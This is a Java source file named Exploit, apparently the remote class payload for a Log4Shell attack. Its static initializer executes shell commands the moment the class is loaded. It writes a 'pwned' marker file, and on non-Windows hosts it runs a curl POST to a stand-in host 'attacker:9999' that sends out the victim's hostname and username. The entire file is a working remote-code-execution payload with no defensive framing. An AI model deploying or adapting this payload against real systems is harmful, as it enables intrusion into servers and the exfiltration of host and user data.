import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.BufferedReader;

public class Exploit {
    static {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String[] cmd;
            
            if (os.contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", "echo Log4Shell_Exploited > C:\\Windows\\Temp\\pwned.txt"};
            } else {
                cmd = new String[]{"/bin/sh", "-c", "echo 'Log4Shell Exploited' > /tmp/pwned.txt && curl -X POST http://attacker:9999/callback -d 'host='$(hostname)'&user='$(whoami)"};
            }
            
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            
            p.waitFor();
            System.out.println("[+] Exploit executed successfully!");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public Exploit() {
        System.out.println("[*] Exploit class instantiated");
    }
}